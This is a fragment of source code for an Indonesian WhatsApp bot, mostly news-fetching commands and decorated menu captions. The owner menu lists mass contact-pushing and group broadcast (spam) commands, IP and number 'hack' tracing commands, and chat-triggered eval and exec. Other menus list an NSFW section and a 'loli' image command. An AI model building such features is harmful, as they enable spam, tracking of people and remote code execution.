┆❐ ${prefix}sound93
┆❐ ${prefix}sound94
┆❐ ${prefix}sound95
┆❐ ${prefix}sound96
┆❐ ${prefix}sound97
┆❐ ${prefix}sound98
┆❐ ${prefix}sound99
┆❐ ${prefix}sound100
┆❐ ${prefix}sound101
┆❐ ${prefix}sound102
┆❐ ${prefix}sound103
┆❐ ${prefix}sound104
┆❐ ${prefix}sound105
┆❐ ${prefix}sound106
┆❐ ${prefix}sound107
┆❐ ${prefix}sound108
┆❐ ${prefix}sound109
┆❐ ${prefix}sound110
┆❐ ${prefix}sound111
┆❐ ${prefix}sound112
┆❐ ${prefix}sound113
┆❐ ${prefix}sound114
┆❐ ${prefix}sound115
┆❐ ${prefix}sound116
┆❐ ${prefix}sound117
┆❐ ${prefix}sound118
┆❐ ${prefix}sound119
┆❐ ${prefix}sound120
┆❐ ${prefix}sound121
┆❐ ${prefix}sound122
┆❐ ${prefix}sound123
┆❐ ${prefix}sound124
┆❐ ${prefix}sound125
┆❐ ${prefix}sound126
┆❐ ${prefix}sound127
┆❐ ${prefix}sound128
┆❐ ${prefix}sound129
┆❐ ${prefix}sound130
┆❐ ${prefix}sound131
┆❐ ${prefix}sound132
┆❐ ${prefix}sound133
┆❐ ${prefix}sound134
┆❐ ${prefix}sound135
┆❐ ${prefix}sound136
┆❐ ${prefix}sound137
┆❐ ${prefix}sound138
┆❐ ${prefix}sound139
┆❐ ${prefix}sound140
┆❐ ${prefix}sound141
┆❐ ${prefix}sound142
┆❐ ${prefix}sound143
┆❐ ${prefix}sound144
┆❐ ${prefix}sound145
┆❐ ${prefix}sound146
┆❐ ${prefix}sound147
┆❐ ${prefix}sound148
┆❐ ${prefix}sound149
┆❐ ${prefix}sound150
┆❐ ${prefix}sound151
┆❐ ${prefix}sound152
┆❐ ${prefix}sound153
┆❐ ${prefix}sound154
┆❐ ${prefix}sound155
┆❐ ${prefix}sound156
┆❐ ${prefix}sound157
┆❐ ${prefix}sound158
┆❐ ${prefix}sound159
┆❐ ${prefix}sound160
┆❐ ${prefix}sound161
╰────────────◇

            ⌈ !!! *Pᴇʀɪɴɢᴀᴛᴀɴ* !!! ⌋
         
*⌘ Bᴀᴄᴀ ᴘᴇʀɪɴɢᴀᴛᴀɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ :*
❑ Uɴᴛᴜᴋ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʏᴀɴɢ ʟᴇʙɪʜ ᴇғᴇᴋᴛɪғ ᴅᴀʟᴀᴍ ᴀᴛᴀsɪ ʙᴀɴɴᴇᴅ ᴘᴀᴅᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʙᴏᴛ ɪɴɪ ᴅɪ ᴜᴛᴀᴍᴀᴋᴀɴ ᴍᴇᴍʙᴀᴄᴀ ʀᴜʟᴇs ʙᴏᴛ ɪɴɪ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴋᴇᴛɪᴋ : *.ʀᴜʟᴇs*
❑ Pᴇɴɢɢᴜɴᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪs ᴅɪ ʙᴀɴɴᴇᴅ ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇɴɢɪᴋᴜᴛɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ Rᴜʟᴇs ʙᴏᴛ ɪɴɪ !!!

╔════⟨ *Gabut - Pribadi* ⟩════❑
╠☞ *${prefix}simip* ⟨ Teman Gabut ⟩
╚════════════════❑

 ⫹⫺ *Tʀɪᴍᴀᴋᴀsɪʜ sᴜᴅᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ* 😘`, m })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    } 
       break
       case 'fajar-news': {
   if (isBan) return reply(mess.ban)	 			
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
replay(teks) 
}) 
 }
    break
case "quotes": {
   if (isBan) return reply(mess.ban)	 			
var res = await Quotes()
teks = "══════════════════"
teks += `\n⌂ *Pᴇɴᴄɪᴘᴛᴀ* : ${res.author}\n══════════════════\n`
teks += `❏ *Qᴜᴏᴛᴇs* :\n`
teks += `➥ "${res.quotes}"\n`
teks += "══════════════════"
replay(teks) 
   }
    break
case "darkjoke": {
   if (isBan) return reply(mess.ban)	 			
var res = await Darkjokes()
teks = "\nDarkjokes*"
tganz.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
} 
    break
case 'cnn-news': {
   if (isBan) return reply(mess.ban)	 			
CNNNews().then(res => {
no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
replay(teks) 
})
}
    break
case 'tvsearch': {
   if (isBan) return reply(mess.ban)	 			
if (!q) return reply('Mau acara tv apa kak ?') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = "══════════════════"
for (let i of res) {
  no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += `══════════════════`
replay(teks) 
})
}
    break
case 'cnbc-news': {
   if (isBan) return reply(mess.ban)	 			
CNBCNews().then(async(res) => {
no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'tribun-news': {
   if (isBan) return reply(mess.ban)	 			
TribunNews().then(async(res) => {
no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'indozone-news': {
   if (isBan) return reply(mess.ban)	 			
IndozoneNews().then(async(res) => {
no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'kompas-news': {
   if (isBan) return reply(mess.ban)	 			
KompasNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'detik-news': {
   if (isBan) return reply(mess.ban)	 			
DetikNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'daily-news': {
   if (isBan) return reply(mess.ban)	 			
DailyNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'inews-news': {
   if (isBan) return reply(mess.ban)	 			
iNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
replay(teks) 
})
}
    break
case 'okezone-news': {
   if (isBan) return reply(mess.ban)	 			
OkezoneNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'sindo-news': {
   if (isBan) return reply(mess.ban)	 			
SindoNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
replay(teks) 
})
}
    break
case 'tempo-news': {
   if (isBan) return reply(mess.ban)	 			
TempoNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case 'antara-news': {
   if (isBan) return reply(mess.ban)	 			
AntaraNews().then(async(res) => {

no = 0
teks = "══════════════════"
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `News: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Type: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
}
    break
case "kontan-news": {
   if (isBan) return reply(mess.ban)	 			
  KontanNews().then(async (res) => {
    
    teks = "══════════════════"
    no = 0
    for (let i of res) {
      no += 1
      teks += `\n• ${no.toString()} •\n`
      teks += `News: ${i.berita}\n`
      teks += `Type: ${i.berita_jenis}\n`
      teks += `Upload: ${i.berita_diupload}\n`
      teks += `Link: ${i.berita_url}\n`
    }
    teks += "══════════════════"
    tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
  })
}
    break
case "merdeka-news": {
   if (isBan) return reply(mess.ban)	 			
  MerdekaNews().then(async (res) => {
    
    teks = "══════════════════"
    no = 0
    for (let i of res) {
      no += 1
      teks += `\n• ${no.toString()} •\n`
      teks += `News: ${i.berita}\n`
      teks += `Upload: ${i.berita_diupload}\n`
      teks += `Link: ${i.berita_url}\n`
    }
    teks += "══════════════════"
    tganz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
  })
}
    break
case "jalantikus-meme": {
   if (isBan) return reply(mess.ban)	 			
  var res = await JalanTikusMeme()
teks = "══════════════════"
teks += "\nLaughing out loud?🥴\n"
teks += `\nSource: ${res}\n`
teks += "══════════════════"
tganz.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
}
    break
            case 'menu':
            case 'help': {
            if (isBan) return reply(mess.ban)
       tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
                tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙

╭✄┈┈┈⟬ *INFO-BOT* ⟭
┆⫹⫺ *Pᴇɴᴄɪᴘᴛᴀ :* ${ownerName}
┆⫹⫺ *Nᴀᴍᴀ Bᴏᴛ :* ${botName}
┆⫹⫺ *Jᴀᴍ :* ${jam}
┆⫹⫺ *Tᴀɴɢɢᴀʟ :* ${tanggal}
┆⫹⫺ *Bᴏᴛ Oɴʟɪɴᴇ :* ${runtime(process.uptime())}
╰──────────────◇
╭✄┈┈⟬ *GC-BOT-OFFICIAL* ⟭
├☞ *https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz*
╰──────────────◇

═════════════════❑
❑ Tᴏᴛᴀʟ ғɪᴛᴜʀ : ⟨ *${totalFitur()}* ⟩
═════════════════❑
${readmore}
╔════⟨ *LIST - FITUR* ⟩════❑
╠☞ *${prefix}allmenu* ⟨ Semua Fitur ⟩
╠☞ *${prefix}listmenu* ⟨ Kumpulan Fitur ⟩
╠☞ *${prefix}menuowner* ⟨ Khusus Owner ⟩
╠☞ *${prefix}menugrup* ⟨ Khusus Grup ⟩
╠☞ *${prefix}menuconvert* ⟨ Menu Konverter ⟩
╠☞ *${prefix}menuvoice* ⟨ Menu Voice ⟩
╠☞ *${prefix}menuopenai* ⟨ Menu Open-AI ⟩
╠☞ *${prefix}menuanime* ⟨ Menu Anime ⟩
╠☞ *${prefix}menudownload* ⟨ Menu Download ⟩
╠☞ *${prefix}menumaker* ⟨ Menu Maker ⟩
╠☞ *${prefix}menuephoto* ⟨ Menu Ephoto ⟩
╠☞ *${prefix}menuramal* ⟨ Menu Ramal ⟩
╠☞ *${prefix}menuasupan* ⟨ Menu Asupan ⟩
╠☞ *${prefix}menulainnya* ⟨ Menu Lainnya ⟩
╠☞ *${prefix}menusound* ⟨ Kumpulan Sound TikTok ⟩
╠☞ *${prefix}menutextpro* ⟨ Menu Text-Pro ⟩
╠☞ *${prefix}menupotoxy* ⟨ Menu PhotoOxy ⟩
╠☞ *${prefix}menunsfw* ⟨ Menu NSFW ⟩
╠☞ *${prefix}menumuslim* ⟨ Menu Muslim ⟩
╠☞ *${prefix}menucecan* ⟨ Menu Cecan ⟩
╠☞ *${prefix}menusticker* ⟨ Menu Sticker ⟩
╚════════════════❑

            ⌈ !!! *Pᴇʀɪɴɢᴀᴛᴀɴ* !!! ⌋
         
*⌘ Bᴀᴄᴀ ᴘᴇʀɪɴɢᴀᴛᴀɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ :*
❑ Uɴᴛᴜᴋ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʏᴀɴɢ ʟᴇʙɪʜ ᴇғᴇᴋᴛɪғ ᴅᴀʟᴀᴍ ᴀᴛᴀsɪ ʙᴀɴɴᴇᴅ ᴘᴀᴅᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʙᴏᴛ ɪɴɪ ᴅɪ ᴜᴛᴀᴍᴀᴋᴀɴ ᴍᴇᴍʙᴀᴄᴀ ʀᴜʟᴇs ʙᴏᴛ ɪɴɪ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴋᴇᴛɪᴋ : *.ʀᴜʟᴇs*
❑ Pᴇɴɢɢᴜɴᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪs ᴅɪ ʙᴀɴɴᴇᴅ ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇɴɢɪᴋᴜᴛɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ Rᴜʟᴇs ʙᴏᴛ ɪɴɪ !!!

╔════⟨ *Gabut - Pribadi* ⟩════❑
╠☞ *${prefix}simip* ⟨ Teman Gabut ⟩
╚════════════════❑

 ⫹⫺ *Tʀɪᴍᴀᴋᴀsɪʜ sᴜᴅᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ* 😘`})
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
            }
            break
            case 'menulist': 
            case 'listmenu': {
         if (isBan) return reply(mess.ban)
    			let sections = [
                {
	           title: '❑ Pilih fitur yang ingin kamu lihat :',
	           rows: [
	            {title: "📡 Seluruh Firur", rowId: `.allmenu`, description: `Menampilkan semua fitur yang ada pada bot ini !`},
                {title: "⚙️ Menu Owner", rowId: `.menuowner`, description: `Menampilkan fitur khusus owner !`},
                {title: "🛡️ Menu Group", rowId: `.menugrup`, description: `Menampilkan fitur khusus dalam grup !`},
                {title: "🖨️ Menu Convert", rowId: `.menuconvert`, description: `Menampilkan fitur convert media !`},
                {title: "🎙️ Menu Voice", rowId: `.menuvoice`, description: `Menampilkan fitur voice !`},
                {title: "💻 Menu Open-AI", rowId: `.menuopenai`, description: `Menampilkan fitur open-ai !`},
                {title: "🎭 Menu Anime", rowId: `.menuanime`, description: `Menampilkan fitur anime !`},
                {title: "💾 Menu Download", rowId: `.menudownload`, description: `Menampilkan fitur download media/file !`},
                {title: "🎨 Menu Maker", rowId: `.menumaker`, description: `Menampilkan fitur maker !`},
                {title: "📷 Menu Ephoto", rowId: `.menuephoto`, description: `Menampilkan fitur ephoto !`},
                {title: "🔮 Menu Ramal", rowId: `.menuramal`, description: `Menampilkan fitur ramal !`},
                {title: "👾 Menu Asupan", rowId: `.menuasupan`, description: `Menampilkan fitur asupan !`},
                {title: "⚒️ Menu Lainnya", rowId: `.menulainnya`, description: `Menampilkan fitur lainnya !`},
                {title: "🎧 Menu Sound", rowId: `.menusound`, description: `Menampilkan fitur sound tiktok !`},
                {title: "📝 Menu TextPro", rowId: `.menutextpro`, description: `Menampilkan fitur textpro !`},
                {title: "📸 Menu PhotoOxy", rowId: `.menupotoxy`, description: `Menampilkan fitur photooxy !`},
                {title: "🕶️ Menu NSFW", rowId: `.menunsfw`, description: `Menampilkan fitur nsfw/terlarang !`},
                {title: "👳🏻‍♀️ Menu Muslim", rowId: `.menumuslim`, description: `Menampilkan fitur muslim !`},
                {title: "👗 Menu Cecan", rowId: `.menucecan`, description: `Menampilkan fitur cecan !`},
                {title: "♻️ Menu Sticker", rowId: `.menusticker`, description: `Menampilkan fitur sticker !`}
	            ]
                }
                ]
        tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            tganz.sendListMsg(m.chat, `*❑ ᴋʟɪᴋ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛᴍᴇɴᴜ ʙᴏᴛ ɪɴɪ !!!*`, ``, 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙

╭✄┈┈┈⟬ *INFO-BOT* ⟭
┆⫹⫺ *Pᴇɴᴄɪᴘᴛᴀ :* ${ownerName}
┆⫹⫺ *Nᴀᴍᴀ Bᴏᴛ :* ${botName}
┆⫹⫺ *Jᴀᴍ :* ${jam}
┆⫹⫺ *Tᴀɴɢɢᴀʟ :* ${tanggal}
┆⫹⫺ *Bᴏᴛ Oɴʟɪɴᴇ :* ${runtime(process.uptime())}
╰──────────────◇
╭✄┈┈⟬ *GC-BOT-OFFICIAL* ⟭
├☞ *https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz*
╰──────────────◇

═════════════════❑
❑ Tᴏᴛᴀʟ ғɪᴛᴜʀ : ⟨ *${totalFitur()}* ⟩
═════════════════❑`, `LISTMENU 📖`, sections, m)
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
         }
            break
            case 'menuowner': 
            case 'ownermenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Oᴡɴᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}public / publik
┆❐ ${prefix}self / sendiri
┆❐ ${prefix}mode ⟨ Mode Akses Bot ⟩
┆❐ ${prefix}matikan ⟨ Matikan Bot ⟩
┆❐ ${prefix}antitag ⟨ Anti Tag Dari Member ⟩
┆❐ ${prefix}myip ⟨ IP BOT ⟩
┆❐ ${prefix}setexif ⟨ Ubah Pack Dan Author ⟩
┆❐ ${prefix}runtime
┆❐ ${prefix}ping
┆❐ ${prefix}setppbot
┆❐ ${prefix}sesibot ⟨ Hasil Sessions Bot ⟩
┆❐ ${prefix}restart ⟨ Restart Run Bot ⟩
┆❐ ${prefix}getcase ⟨ Lihat Case Bot ⟩
┆❐ ${prefix}ban ⟨ Batas Penggunaan Bot ⟩
┆❐ ${prefix}unban ⟨ Bebas Penggunaan Bot ⟩
┆❐ ${prefix}listban ⟨ List Pengguna Banned ⟩
┆❐ ${prefix}out ⟨ Keluar Dari Grup ⟩
┆❐ ${prefix}cekid ⟨ Semua ID Grup ⟩
┆❐ ${prefix}listgc ⟨ Semua Info Grup ⟩
┆❐ ${prefix}listpc ⟨ Semua Chat Pribadi ⟩
┆❐ ${prefix}cekmem ⟨ Cek Jumlah Member Grup ⟩
┆❐ ${prefix}pushid ⟨ Push Kontak Via ID Grup ⟩
┆❐ ${prefix}pushkontak ⟨ Push Kontak Via Grup ⟩
┆❐ ${prefix}pushmem ⟨ Push Pesan Semua Grup - JPM ⟩
┆❐ ${prefix}blokir ⟨ Tag/Nomor ⟩
┆❐ ${prefix}bukablokir ⟨ Tag/Nomor ⟩
┆❐ ${prefix}hackip ⟨ Lacak Alamat IP ⟩
┆❐ ${prefix}hackwa ⟨ Identifikasi Nomor WA ⟩
┆❐ ${prefix}=> ⟨ Eval ⟩
┆❐ ${prefix}$ ⟨ Exec ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'convertmenu': 
       case 'konvertmenu': 
       case 'menukonvert': 
       case 'menuconvert': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Cᴏɴᴠᴇʀᴛᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}toimg
┆❐ ${prefix}tourl ⟨ Balas Gambarnya ⟩
┆❐ ${prefix}tohd ⟨ Enhance Foto ⟩
┆❐ ${prefix}tomp3
┆❐ ${prefix}tomp4
┆❐ ${prefix}tovn
┆❐ ${prefix}togif
┆❐ ${prefix}jadianime
┆❐ ${prefix}findmusic ⟨ Mengidentifikasi Nama Musik ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'voicemenu':
       case 'menuvoice': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Vᴏɪᴄᴇ Cʜᴀɴɢᴇʀ* ⟭
┆❐ ${prefix}bass
┆❐ ${prefix}blown
┆❐ ${prefix}deep
┆❐ ${prefix}earrape
┆❐ ${prefix}fast
┆❐ ${prefix}laki-laki ⟨ Suara Laki-Laki ⟩
┆❐ ${prefix}perempuan ⟨ Suara Perempuan ⟩
┆❐ ${prefix}fat
┆❐ ${prefix}nightcore
┆❐ ${prefix}remix
┆❐ ${prefix}reverse
┆❐ ${prefix}robot
┆❐ ${prefix}slow
┆❐ ${prefix}smooth
┆❐ ${prefix}tupai
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menuai': 
       case 'menuopenai': 
       case 'openaimenu': 
       case 'aimenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Oᴘᴇɴ - AI* ⟭
┆❐ ${prefix}ai
┆❐ ${prefix}openai
┆❐ ${prefix}ai-img
┆❐ ${prefix}aigambar
┆❐ ${prefix}simi ⟨ Alternatif Open-AI ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menuanime': 
       case 'animemenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Aɴɪᴍᴇ Mᴇɴᴜ* ⟭
┆❐ ${prefix}akira
┆❐ ${prefix}akiyama
┆❐ ${prefix}ana
┆❐ ${prefix}asuna
┆❐ ${prefix}ayuzawa
┆❐ ${prefix}boruto
┆❐ ${prefix}chitoge
┆❐ ${prefix}deidara
┆❐ ${prefix}doraemon
┆❐ ${prefix}elaina
┆❐ ${prefix}emilia
┆❐ ${prefix}erza
┆❐ ${prefix}gremory
┆❐ ${prefix}hestia
┆❐ ${prefix}hinata
┆❐ ${prefix}inori
┆❐ ${prefix}isuzu
┆❐ ${prefix}itachi
┆❐ ${prefix}itori
┆❐ ${prefix}kaga
┆❐ ${prefix}kagura
┆❐ ${prefix}kakasih
┆❐ ${prefix}kaori
┆❐ ${prefix}keneki
┆❐ ${prefix}kotori
┆❐ ${prefix}kurumi
┆❐ ${prefix}loli
┆❐ ${prefix}madara
┆❐ ${prefix}mikasa
┆❐ ${prefix}miku
┆❐ ${prefix}minato
┆❐ ${prefix}naruto
┆❐ ${prefix}nezuko
┆❐ ${prefix}onepiece
┆❐ ${prefix}pokemon
┆❐ ${prefix}rize
┆❐ ${prefix}sagiri
┆❐ ${prefix}sakura
┆❐ ${prefix}sasuke
┆❐ ${prefix}shina
┆❐ ${prefix}shinka
┆❐ ${prefix}shizuka
┆❐ ${prefix}shota
┆❐ ${prefix}toukachan
┆❐ ${prefix}tsunade
┆❐ ${prefix}yuki 
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'downloadmenu': 
       case 'menudownload': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Dᴏᴡɴʟᴏᴀᴅ Mᴇɴᴜ* ⟭
┆❐ ${prefix}mp3 ⟨ Metode Audio ⟩
┆❐ ${prefix}mp4 ⟨ Metode Video ⟩
